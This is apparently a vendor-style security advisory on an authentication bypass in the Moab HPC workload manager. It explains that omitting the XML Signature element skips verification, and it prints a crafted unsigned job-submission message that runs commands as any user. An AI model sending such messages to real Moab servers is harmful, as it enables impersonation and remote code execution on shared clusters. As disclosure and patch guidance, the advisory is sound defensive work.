The issue is believed to affect all versions of Moab prior to versions 7.2.9 and Moab 8. ，  [ Impact ]  ， Successful exploitation could lead to remote code execution. ，  [ Cause ]  ， The Moab server does not appropriately authenticate requests. ，  [ Solution ]  ， Upgrade to Moab 7.2.9 , Moab 8 , or a later version of the software. Beta versions of Moab 8 are affected by this issue. This issue also affects versions of Moab which are using Munge for authentication. ， This issue is believed to affect all instances of Moab prior to version 7.2.9 and 8. MWR are not aware of any alternate workaround for this issue. ，  [ Technical Details ]  ， Moab is a workload manager used in High Performance Computing ( HPC ) environments. In a typical environment a user submits their jobs to the Moab server for it to handle the workload. This communication makes use of an XML based protocol , and example job submission is shown below :  ， <Envelope component=\"ClusterScheduler\" count=\"1\" name=\"moab\" type=\"nonblocking\" version=\"8.0.beta.2\"> ， <Signature> ， <DigestValue>7v49VzAlbyNQ4O3VChCus+v2LeE=</DigestValue> ， <SignatureValue>QG13cmxhYnMgRWFzdGVyIEVnZyE=</SignatureValue> ， </Signature> ， <Body actor=\"test\" timestamp=\"1408488412\"> ， <Request action=\"submit\" actor=\"test\" cmdline=\"\\STARTmsub\"> ， <Object>job</Object> ， <job> ， <Owner>test</Owner> ， <UserId>test</UserId> ， <GroupId>test</GroupId> ， <InitialWorkingDirectory>/home/test</InitialWorkingDirectory> ， <UMask>2</UMask> ， <Executable>/usr/bin/id</Executable> ， <SubmitLanguage>PBS</SubmitLanguage> ， <SubmitString>\\START/usr/bin/id\\0a\\0a</SubmitString> ， </job> ， </Request> ， </Body> ， </Envelope> ， Contained within this message is a <Signature> element , which contains both a <DigestValue> and <SignatureValue> elements. The <DigestValue> is simply a SHA1 sum of the <Body> element. The <SignatureValue> , however , is computed based upon a key ( .moab.key ) which is read by a setuid root binary ( mauth ) which performs some additional verification of the user before providing a signature for the message. This use of signatures is intended to prevent users from being able to craft arbitrary messages as the signature value is validated by the Moab server. Messages containing an incorrect signature for the message will be rejected. ， However , whilst an incorrect SignatureValue results in a rejected message , it was found that if no signature is supplied then the signature checks are skipped and the remainder of the message processed. As a result it is possible to craft arbitrary messages and these messages will be accepted and honoured by the server as long as the message does not include a <Signature> element. ， The following message contains no signature element and therefore will be accepted by the server :  ， <Envelope component=\"ClusterScheduler\" count=\"1\" name=\"moab\" type=\"nonblocking\" version=\"8.0.beta.2\"> ， <Body actor=\"test\" timestamp=\"1408488412\"> ， <Request action=\"submit\" actor=\"test\" cmdline=\"\\STARTmsub\"> ， <Object>job</Object> ， <job> ， <Owner>test</Owner> ， <UserId>test</UserId> ， <GroupId>test</GroupId> ， <InitialWorkingDirectory>/home/test</InitialWorkingDirectory> ， <UMask>2</UMask> ， <Executable>/usr/bin/id</Executable> ， <SubmitLanguage>PBS</SubmitLanguage> ， <SubmitString>\\START/usr/bin/id\\0a\\0a</SubmitString> ， </job> ， </Request> ， </Body> ， </Envelope> ， With no signing taking place an adversary can specify arbitrary users for these operations to be performed under , and thus impersonate other users including executing jobs as other users.",
